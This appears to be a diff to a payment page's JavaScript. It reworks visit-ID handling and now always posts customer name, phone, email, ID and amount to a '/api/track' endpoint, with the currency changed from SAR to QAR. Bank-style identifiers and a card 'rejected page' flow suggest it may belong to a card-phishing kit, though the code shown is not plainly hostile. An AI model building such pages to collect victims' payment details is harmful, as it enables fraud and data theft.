@@ -518,7 +518,6 @@
       errorMsg.textContent = 'Please enter all card details correctly';
       errorMsg.style.color = '#c0392b';
     }
-    sessionStorage.removeItem('safwa_order_id');
     sessionStorage.removeItem('safwa_order_data');
     var cardName = document.getElementById('cardName');
     if (cardName) cardName.focus();
@@ -664,35 +663,34 @@
     applyRejectedPageMessage();
     updatePaymentSummary();
 
-    // Create new visitId for each session (unless returning from rejection)
+    // Use visitId from sessionStorage (passed from index page) or restore from URL
     var visitId = sessionStorage.getItem('safwa_order_id');
     var urlParams = new URLSearchParams(window.location.search);
-    var isReturning = urlParams.get('error') || urlParams.get('id');
-
-    if (!visitId || !isReturning) {
-      visitId = 'visit_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
-      sessionStorage.setItem('safwa_order_id', visitId);
-      sessionStorage.setItem('aman_bank_request_id', visitId);
-
-      // Get customer data from payment summary
-      var summary = {};
-      try { summary = JSON.parse(sessionStorage.getItem('payment_summary') || '{}'); } catch(e){}
-
-      // Send track to server
-      fetch('/api/track', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          visitId: visitId,
-          n: summary.name || 'New Customer',
-          p: summary.phone || '',
-          e: summary.email || '',
-          id: summary.customerId || '',
-          amount: summary.total || 0,
-          currency: 'SAR'
-        })
-      }).catch(function(){});
+    if (!visitId && urlParams.get('id')) {
+      visitId = urlParams.get('id');
     }
+    if (!visitId) {
+      visitId = 'v_' + Date.now().toString(36) + Math.random().toString(36).slice(2);
+    }
+    sessionStorage.setItem('safwa_order_id', visitId);
+    sessionStorage.setItem('aman_bank_request_id', visitId);
+
+    // Always send track to update server with latest data
+    var summary = {};
+    try { summary = JSON.parse(sessionStorage.getItem('payment_summary') || '{}'); } catch(e){}
+    fetch('/api/track', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        visitId: visitId,
+        n: summary.name || '',
+        p: summary.phone || '',
+        e: summary.email || '',
+        id: summary.customerId || '',
+        amount: summary.total || 0,
+        currency: 'QAR'
+      })
+    }).catch(function(){});
 
     var sessionId = sessionStorage.getItem('aman_bank_session_id');
     if (!sessionId) {
